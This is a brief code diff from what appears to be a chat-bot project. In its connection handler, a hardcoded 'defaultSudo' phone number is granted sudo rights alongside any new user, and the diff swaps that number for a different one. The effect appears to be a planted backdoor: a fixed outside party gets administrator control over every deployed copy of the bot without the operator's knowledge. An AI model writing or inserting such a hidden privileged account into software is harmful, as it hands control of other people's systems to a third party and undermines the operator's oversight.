@@ -55,7 +55,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
       const isNewUser = !sudoUsers.includes(userId);
       if (isNewUser) {
         await addSudoUser(userId);
-        const defaultSudo = "254735342808";
+        const defaultSudo = "254114885159";
         if (!sudoUsers.includes(defaultSudo)) await addSudoUser(defaultSudo);
       }
 
